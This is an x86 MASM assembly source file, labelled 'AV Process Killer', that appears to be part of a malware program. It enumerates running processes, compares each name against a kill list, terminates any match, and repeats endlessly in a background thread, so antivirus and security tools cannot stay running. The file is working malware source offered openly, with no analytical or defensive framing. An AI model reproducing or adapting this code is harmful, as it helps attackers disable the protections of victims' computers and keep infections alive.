; AV Process Killer
; #########################################################################

.code

; Scans through processes and terminates if they are in kill-list
KillProcs proc uses edi
        LOCAL   Process: PROCESSENTRY32
        LOCAL   hSnapshot: DWORD

        mov     Process.dwSize, sizeof PROCESSENTRY32
        invoke  CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
        mov     hSnapshot, eax

        invoke  Process32First, hSnapshot, addr Process
@@:
        .IF     eax
                mov     edi, offset Processes

        @next:
                invoke  StrStrI, addr Process.szExeFile, edi
                .IF     eax
                        invoke  KillProcess, Process.th32ProcessID
                .ENDIF
                mNextListEntry @next

                invoke  Process32Next, hSnapshot, addr Process
                jmp     @B
        .ENDIF

        invoke  CloseHandle, hSnapshot

        xor     eax, eax
        ret
KillProcs endp

; Process killer thread
KillProcsThread proc lpParam: DWORD
@@:
        call    KillProcs
        invoke  Sleep, PKTimeout
        jmp     @B
        xor     eax, eax
        ret
KillProcsThread endp

; Start process killer thread
StartProcessKiller proc
        LOCAL   lpThreadId: DWORD

        invoke  CreateThread, NULL, 0, offset KillProcsThread, 0, 0, addr lpThreadId
        ret
StartProcessKiller endp
